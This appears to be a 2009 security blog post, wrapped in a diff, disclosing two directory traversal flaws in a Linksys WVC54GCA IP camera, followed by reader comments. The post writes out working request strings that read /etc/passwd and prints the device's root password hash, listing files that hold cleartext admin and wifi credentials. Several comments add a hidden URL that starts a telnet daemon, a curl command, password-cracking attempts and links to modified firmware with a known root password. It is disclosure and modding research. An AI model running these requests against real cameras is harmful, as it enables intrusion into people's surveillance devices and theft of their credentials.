@@ -1,0 +1,205 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hacking Linksys IP Cameras (pt 3)</title><meta name="description" content="This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2)."><meta property="name" content="Hacking Linksys IP Cameras (pt 3)"><meta itemprop="name" content="Hacking Linksys IP Cameras (pt 3)"><meta property="description" content="This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2)."><meta itemprop="description" content="This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2)."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fhacking-linksys-ip-cameras-pt-3%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fhacking-linksys-ip-cameras-pt-3%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/"><meta property="og:title" content="Hacking Linksys IP Cameras (pt 3)"><meta property="og:description" content="This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2)."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fhacking-linksys-ip-cameras-pt-3%2F?w=1024"><meta name="twitter:title" content="Hacking Linksys IP Cameras (pt 3)"><meta name="twitter:description" content="This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2)."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fhacking-linksys-ip-cameras-pt-3%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Hacking Linksys IP Cameras (pt 3)</h1><div>Thu, 23 Apr 2009 00:52:28 GMT</div><div id="post-content"><p><em>This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: <a href="/blog/hacking-linksys-ip-cameras-pt-1/">Hacking Linksys IP Cameras (pt 1)</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-2/">Hacking Linksys IP Cameras (pt 2)</a>.</em></p>
+<p>Unlike the <a href="/blog/hacking-linksys-ip-cameras-pt-1/">previous</a> <a href="/blog/hacking-linksys-ip-cameras-pt-2/">two</a> vulnerabilities I released, the vulnerabilities I&#39;m releasing in this post are perhaps not so useful to break into the device as you need access to the admin account to exploit them. Nevertheless, these vulnerabilities might be useful for users who want to hack their Linksys IP cameras for modding purposes, rather than being used by an attacker aiming to crack into someone else&#39;s camera.</p>
+<h3 id="two-directory-traversal-vulnerabilities">Two directory traversal vulnerabilities</h3>
+<p>Today, instead of releasing just one vulnerability I&#39;ll be releasing two! These two vulnerabilities have helped me understand more about how the WVC54GCA wireless camera internals and I&#39;m hoping they will also work on other Linksys camera models. Please let me know if you successfully test them on other models too!</p>
+<p>Both vulnerabilities are of type directory traversal, aka arbitrary file retrieval, and they both affect the same CGI program: <code>/adm/file.cgi</code>. Please note that these vulnerabilities are different to <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2507">CVE-2004-2507</a>/<a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected <code>/main.cgi</code> instead.</p>
+<h4 id="1st-directory-traversal-hole">1st directory traversal hole</h4>
+<p>It seems that the <code>next_file</code> parameter is not filtered enough when submitted to <code>/adm/file.cgi</code>, so that either of the following requests will return the content of any file whose location is known (<code>/etc/passwd</code> in this case):</p>
+<pre><code>/adm/file.cgi?next_file=%2fetc%2fpasswd
+/adm/file.cgi?next_file=%2fetc/passwd
+/adm/file.cgi?next_file=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd
+
+#### 2nd directory traversal hole
+
+In the case of the second directory traversal hole, the vulnerable parameter (`this_file`) is not filtered at all whatsoever. So hex-encoding special symbols is _not_ required:
+
+/adm/file.cgi?todo=pwnage&amp;this_file=/etc/passwd
+
+The following is the content of the Linux `passwd` file containing the encrypted root password. Remember that the WVC54GCA comes with BusyBox Linux by default which you can confirm by opening `bin/busybox` with any of the vulnerabilities previously discussed. I&#39;m curious to know if the `passwd` file contains the same password on all cameras of the same model, or even if Linksys is also using the same password on other models:
+
+root:9szj4G6pgOGeA:0:0:root:/root:/bin/sh</code></pre><p>Notice that when exploiting the first vulnerability, we need to convert forward slashes to <code>%2f</code> which is its hex-encoding equivalent. This is because the developer (poorly) attempted to filter directory traversal sequences when data is submitted via the <code>next_file</code> parameter. In the third example, we also partially hex-encode <code>../</code> sequences in order to avoid being blocked by the script which results in a forbidden error.</p>
+<p>Needless to say, if the root password is not too strong you should be able to crack it using <a href="http://www.openwall.com/john/">john</a> or you favorite password cracking tool. I loaded passwd with john for a few hours on an old laptop and nothing was found, so I&#39;m guessing the root password is not extremely weak. If you model comes with the telnet daemon running by default, cracking that password should give you root shell access.</p>
+<p>Unfortunately, as I mentioned in the <a href="/blog/hacking-linksys-ip-cameras-pt-1/">first post</a> of these series, the WVC54GCA camera comes with a telnet daemon included, but it&#39;s off by default. I haven&#39;t managed to enable the telnet daemon and get a remote root shell yet although I suspect it might be possible by <a href="http://brooknet.no-ip.com/~lex/public/WVC54G/">modifying</a> the bin firmware image and uploading it again.</p>
+<h4 id="what-can-we-do-with-these-vulnerabilities-">What can we do with these vulnerabilities?</h4>
+<p>Well, I tried finding files that contain interesting information that helps you understand the camera better. The following are some examples:</p>
+<ul>
+<li><code>/etc/passwd</code> : traditional-DES-format password file with no salt</li>
+<li><code>/usr/local/www/img/.htpasswd</code> : HTTP credentials stored in cleartext</li>
+<li><code>/usr/local/www/adm/.htpasswd</code> : contains same data as previous file</li>
+<li><code>/etc/system.conf</code> : all camera settings stored in cleartext including admin password, wifi encryption key, etc ...</li>
+<li><code>/usr/local/bin/thttpd.conf</code> : web server config file confirming the daemon runs as root, which is the only system account present anyway</li>
+<li><code>/etc/init.d/rcS</code>  :  here we see the line that starts the telnet daemon (<code>/usr/sbin/telnetd</code>) commented out</li>
+<li><code>/etc/def_sys.conf</code> : camera&#39;s default settings</li>
+<li><code>/etc/system.conf</code> : camera&#39;s current settings</li>
+<li><code>/var/nc.log</code> : network connections logs</li>
+<li><code>/etc/group</code></li>
+<li><code>/etc/inittab</code></li>
+<li><code>/proc/cpuinfo</code> : processor details</li>
+<li><code>/proc/meminfo</code></li>
+<li><code>/proc/version</code> : OS details</li>
+<li><code>/proc/uptime</code></li>
+</ul>
+<p>Finding a file upload vulnerability should allow us to overwrite the <code>/etc/init.d/rcS</code> file and eventually manage to start the telnet server after reboot. By overwriting the <code>/etc/passwd</code> file with our own we should be able to add our own root password. Unfortunately, I haven&#39;t discovered any vulnerability that would allow me to upload files to arbirary locations. If you do discover one, please let me know. I&#39;d love to hear the details.</p>
+<h3 id="testing-info">Testing Info</h3>
+<p>Directory traversal vuln #1 successfully tested on:</p>
+<ul>
+<li>WVC54GCA</li>
+<li>Firmware V1.00R22 and V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+<p>Directory traversal vuln #2 successfully tested on:</p>
+<ul>
+<li>WVC54GCA</li>
+<li>V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul>
+<p>Although I never tested the second traversal vulnerability on Firmware V1.00R22, I definitely suspect it will work on this previous firmware version as well.</p>
+<p><em>Please note that the aforementioned vulnerabilities are different to <a href="http://www.securityfocus.com/bid/10476/exploit">BID 10476</a> which affected the <code>/main.cgi</code> program rather than <code>/adm/file.cgi</code>.</em></p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="gat3way"><span>gat3way</span><div class="post-comment-content">Even if you find a file upload vulnerability, I doubt that it would be possible to overwrite anything in /etc/init.d (since it's root-owned and I doubt the webserver runs with uid=0/euid=0). Furthermore, AFAIK it's a cramfs filesystem which does not support writes at all. 
+
+But probably this could be circumvented by uploading a new modified firmwire somehow?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@gat3way: the web server MUST run as root since 'root' is the only OS account available (see contents of <code>/etc/passwd</code> file shown in this post).
+
+This can be confirmed by retrieving the contents of <code>/usr/local/bin/thttpd.conf</code> using any of the directory traversal vulnerabilities I just released. Notice the line containing <code>user=root</code>:
+
+<pre><code># This section overrides defaults
+dir=/usr/local/www
+#dir=/tmp/www
+user=root	# default = nobody
+#logfile=/var/log/thttpd.log
+pidfile=/var/run/thttpd.pid
+cgipat=cgi|cfg|sdp|jpg
+# This section _documents_ defaults in effect
+# port=80
+nosymlink	# default = !chroot
+novhost
+# nocgipat
+# nothrottles
+# host=0.0.0.0
+# charset=iso-8859-1</code></pre>
+
+However, you're probably right that the filesystem is cramfs, which (as you said) would mean that a file upload vuln would NOT help getting our root shell.
+
+From http://en.wikipedia.org/wiki/Cramfs:
+
+<blockquote>The file system is intentionally read-only to simplify its design</blockquote></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ladinu"><span>Ladinu</span><div class="post-comment-content">I just got this camera (same model) and tested out the vuln. It looks like that all linksys cameras have the same password.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@Ladinu: thanks a lot for testing. That's very useful to know. I wonder if other Linksys camera models different to the WVC54GCA also come with the same root password?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="gat3way"><span>gat3way</span><div class="post-comment-content">Anyway, I'm now running john against the DES-crypted password. We'll see what is going to come out after the weekend. I'm curious about what default root password did Cisco/Linksys guys choose.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@gat3way: hehe, im curious too. i've had john running for a while, but no luck yet. last password it tried was 'Tr92m3l', so it's tried relatively-complex passwords already. anyways, please post the password if you leave the cracking session for long enough and finally obtain it .</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ladinu"><span>Ladinu</span><div class="post-comment-content">Talked to a friend who had a different model (CIC-930W). The vuln work for this one too. The root password hash is the same.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Bruno"><span>Bruno</span><div class="post-comment-content">Hi together,
+
+I've found a way to start the telnet daemon (Firmware V1.00R24).
+
+<pre><code>/adm/file.cgi?inject_telnetd</code></pre>
+
+<pre><code>telnet cam
+Trying xxx.xxx.xxx.xxx...
+Connected to cam.
+Escape character is '^]'.
+cam login:  
+Login timed out after 60 seconds.
+Connection closed by foreign host.</code></pre>
+
+But not the pwd? What does John say?
+
+Greetings
+Bruno</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@Bruno: i cannot replicate the steps you provided, although i can confirm the 'inject_telnetd' string is part of the '/adm/file.cgi' binary. I tried accessing the URL you provided after logging in with the 'admin' account and no luck :(
+
+Am I missing anything?
+
+btw, my john session is still running and still no luck. not sure if gat3way managed to get anywhere with his john session?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Bruno"><span>Bruno</span><div class="post-comment-content">@pagvac: I am so sorry. I tried many things that evening and there was a little 'todo=' missing. I could not remember, but I did it again - found it in my brain after thinking a long time - and here comes the uncut howto after a power on (I tried it twice, please confirm):
+
+1. try a telnet connect to the cam like this:
+
+telnet IP-OF-CAM
+Trying IP-OF-CAM...
+telnet: Unable to connect to remote host: Connection refused
+result: not telnetd on cam after power on - thats standard config.
+
+2. type in that url in your browser:
+
+<pre><code>http://IP-OF-CAM/adm/file.cgi?todo=inject_telnetd</code></pre>
+
+you have to type in your admin account and pwd for cam-administration. You receive error:
+
+<pre><code>File (null) not found</code></pre>
+
+in your Browser.
+
+Don't care about that and don't power down the cam.
+
+3. try again the telnet connect from step 1
+
+<pre><code>telnet IP-OF-CAM
+Trying IP-OF-CAM...
+Connected to IP-OF-CAM.
+Escape character is '^]'.
+cam login: </code></pre>
+
+Here you are and you are missing the root pwd.  Every user can get the adm-pwd with your tips and every user can start the telnet demon after reading this. Nice feature. Login ist quite a problem.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">@Bruno: I can confirm that DOES work. that's a very cool backdoor/debug feature which you have discovered! awesomeness</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">For anyone interested, Bruno eventually figured out the "telnetd enabling" feature by
+
+1) parsing the strings of the '/adm/file.cgi' binary using any of the directory traversal vulnerabilities I released in this post and 
+
+2) trial and error. ie: experimenting with already-known parameters processed by the 'file.cgi' program such as 'todo' (aforementioned in this post)
+
+For instance, you can do the following with curl:
+
+<pre><code>$ curl -s --url "http://192.168.1.115/adm/file.cgi?todo=pwnage&this_file=file.cgi" -u admin:C4mP4ssw0rd | strings |  grep -i telnet</code></pre>
+
+Which returns:
+
+<pre><code>/usr/sbin/telnetd &gt; /dev/null 2&gt; /dev/null &
+&lt;head&gt;&lt;title&gt;Open TelnetD&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;p&gt;&lt;b&gt;&lt;font size=6&gt;Open Telnet Daemon successfully!&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;/body&gt;
+inject_telnetd</code></pre>
+
+Notice the last string returned ('inject_telnetd') which is the value that needs to be assigned to the 'todo' parameter in order to enable the telnet daemon.
+
+I'm guessing there must be a neat way to obtain all parameters processed by '/adm/file.cgi' by analyzing the binary. Using IDA Pro perhaps? the binary is of type 'ELF 32-bit LSB executable, ARM, version 1' if anyone wants to know
+
+<pre><code>$ file file.cgi
+file.cgi: ELF 32-bit LSB executable, ARM, version 1, dynamically linked (uses shared libs), stripped</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Borys"><span>Borys</span><div class="post-comment-content">It is possible to run something via opening file with "|" at the end?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nick"><span>nick</span><div class="post-comment-content">I used the above to get info about this type of camera off the one I have. Nice work guys! Couple of questions. Has John finished his cogitations yet? Also, how does the camera save its altered config settings if the cramfs file system is read only...? That file must be writable by root surely. The reason I ask is that I want to mod the camera to reduce a motion detection setting (md_sensitivity). The default is ridiculously too sensitive as is widely acknowledged in many forums. I was thinking about trying to recompile the OS using the source off the linksys web site and (with having the learn it...) a cross compiler. However, being able to telnet into the camera as root and simply changing the values (default is 6) of the md sensitivity sounds much easier - providing I have root access (therefore need password) and can actually write to the config file (hence asking about the cramfs file system). Anyone got any thoughts?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Maurice"><span>Maurice</span><div class="post-comment-content">I am still running john to get the password still nothing found.
+I want the same as what Nick wants reducing the motion sensibility. There should be a firmware around that is dealing with this issue. Version 1.1.0.0 build 2 look at this forum thread. http://forums.linksysbycisco.com/linksys/board/message?board.id=Cameras&amp;thread.id=10525
+
+If I have some luck I will post the password.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nick"><span>nick</span><div class="post-comment-content">Maurice, very interesting information. I saw that thread on the forum when it was in its infancy and there was uncertainty about whether the 1.1 firmware was the newer one. Looks like it is, which makes the lack of its addition to the Linksys download area really odd. If they have decided it is stable enough to put on new retail cameras, it should be stable enough to post on the download area for current owners to use. Most strange. I would recommend everyone contact Linksys to ask them to make it available.
+
+I threw John at the password on a P3 for a week or so with no luck. It was testing 180000 combinations a second and the last passwords were fairly complex. Hence, it appears that the root password is not trivial. Even though this is a "simple" DES password, statistics show that for a good password, you need about 1000 P4s working on it for a year in order to guarantee a crack. Hence, a lot of luck is needed if using a single machine! I do wish you luck though. In the meantime, I recommend everyone who is interested in getting their cameras working better contact Linksys regularly to ask about the new firmware.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nick"><span>nick</span><div class="post-comment-content">Update....
+
+Knew I should have checked the linksys website before posting. The new 1.1 firmware is now available in their support area. It is dated 15th June 2009, which I don't think can be the date it was posted on their site, since I looked several times since then and it was not there (just the older one).
+
+Go get it!!!!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Bruno"><span>Bruno</span><div class="post-comment-content">The telnetd-injection is still working with the firmware "1.1.00 build 2". We still need the password.
+
+The revision history told about some security fixing. They disabled the Support of "Setup Wizzard".
+
+A new feature is the proprietary HNAP protocol. You get a xml if you try http://IP-OF-CAM/HNAP1/. Can somebody tell the truth about security of HNAP?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Rogan Dawes"><span>Rogan Dawes</span><div class="post-comment-content">You have a few options remaining to you.
+
+1. Try to get a serial console on your camera. This will void any warranties that you have, because you'll have to open it up. You'll also need to get a suitable level convertor, to convert between the usual RS-232 at 12V, to the TTL signalling expected by the camera at 3V.
+
+The easiest way to do this is to get a CA-42 cellphone cable, which basically provides a USB to TTL serial convertor. You'll also need to identify the pins on the circuit board that are the serial port. Most likely you'll find a 4 or 5 pin header, or possibly an unpopulated header (just the holes). Identify which ones are ground using a multimeter, one will probably be 3V, and the others will be RX and TX.
+
+Once you have a console cable, you will be able to get a shell most likely, because very few manufacturers make you log in on the console.
+
+2. An alternative is to extract the cramfs filesystem from the firmware, mount it via loopback, copy everything off it into a new directory, delete root's password and set up the telnet daemon to start automatically, then rebuild the cramfs and the firmware. Finally, flash your rebuilt firmware onto the camera.
+
+It should not be too difficult to figure out the firmware format, most likely it is the same as that used for the WRT54G and so forth.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="L0RE"><span>L0RE</span><div class="post-comment-content">No Warenty,. You can Damage your Hardware.  Im Not Responsible... you know such stuff .... i compiled the last Firmware (1.00 R24) With telnet enabled and root password: toor
+
+Happy Linuxing :-). I would be happy Hearing from you</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="L0RE"><span>L0RE</span><div class="post-comment-content">Sorry i Forgot the most Important The Link http://rapidshare.com/files/423484428/WVC54GCA.bin</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="VaZso"><span>VaZso</span><div class="post-comment-content">@Rogan Dawes
+
+I have the latest firmware on my WVC54GC v1.1, which says "V1.26, Feb 03, 2008". I've tried to re-pack the filesystem, but no luck. First, I've cut the first part of the firmware file (part1) until the filesystem (fs), then the last part (part2) of it. The filesystem itself is a cramfs file of 1511424 bytes. Info: "Linux Compressed ROM File System data, little endian size 1511424 version #2 sorted_dirs CRC 0x3a60d0db, edition 0, 777 blocks, 288 files"
+
+I've downloaded and compiled cramfs tools from here: http://sourceforge.net/projects/cramfs/ For the fs, cramfsck tools says: "file inode has zero size and non-zero offset"
+
+...and it cannot extract whole of the data (just some of the files).
+
+I've mounted the filesystem as a loop device, copied to another directory, then re-packed it using mkcramfs (I've tried it also without any modifications, just with repacking).
+
+For the created file, file info says: "Linux Compressed ROM File System data, little endian size 1511424 version #2 sorted_dirs CRC 0x1b6023e1, edition 0, 777 blocks, 288 files" Finally, I've copied part1 + fs + part2 together. The file seemed to be correct, but when I've tried to upload it to the webcam, it said after a while: "Error: Upgrade file format error" I think the problem is the original cramfs on the device is somehow a bit modified version, or at least I don't know what "file inode has zero size and non-zero offset" means or how can I make a suitable image for the device. Naturally, the fs begins on a different address in this firmware than the one was mentioned here. Has anybody any idea how to go on?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Bruno"><span>Bruno</span><div class="post-comment-content">@LORE, would you be so kind and give us a short howto compile and build the firmware?
+
+That would be very helpful for me.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="oliver"><span>oliver</span><div class="post-comment-content">I found that http://nurds-r-us.blogspot.com/ also was hacking around with this cam, and being curious about both camera's mentioned I donwloaded both GPL source packages. Appearantly, linksys bought the IP from sercomm (sitecom) as their version of the package, albeit 125mb larger (i think toolchain sources are included), is filled with license files indicating that it is in fact, from sercomm.
+
+So the linksys cam is actually a sercomm cam.
+
+I suppose both gpl archives should be buildable and create a working binary that can be flashed.
+
+Browsing through both packages, it seems to all come from cadenux, a ucLinux specialist service.
+Strangly, under userland/cron/ is a file called uClinux-dist-20020220.tar.gz (combined with some txt file about it) which probably should be there, and is the cause for the 175mb binary.
+
+Interestingly however is, that the sitecom GPL package has only left some binary object files for certain modules, gpio, led, switch etc, but the linksys version does include these files.
+WiFi seems to be binary only for both unfortunatly, though personally i'd prefer a lan only version, ideally PoE.
+
+Just some food for thought.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="supbro"><span>supbro</span><div class="post-comment-content">I installed LORE's image on my WVC54GCA which had the latest official software, and now I have root! cool! But the rapidshare link he posted was no longer valid, here's the one I used:
+
+http://rapidshare.com/files/424551784/WVC54GCA.bin</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
